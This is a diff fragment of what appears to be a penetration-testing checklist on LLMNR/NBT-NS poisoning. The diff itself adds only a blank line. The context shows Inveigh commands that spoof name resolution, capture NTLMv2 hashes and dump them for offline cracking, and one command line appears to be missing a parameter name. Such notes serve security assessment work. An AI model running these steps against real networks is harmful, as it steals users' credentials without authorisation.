@@ -37,6 +37,7 @@ WHY: LLMNR (5355)/NBT-NS (137) fall back when DNS fails; we spoof the name and t
 Import-Module .\Inveigh.ps1
 Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
 .\Inveigh.exe
+
 ```
 WHY: Windows-native equivalent of Responder; the C# build has a semi-interactive console for captured data.
 - [ ] works → in the C# console `GET NTLMv2UNIQUE` / `GET NTLMv2USERNAMES`; crack offline (mode 5600).
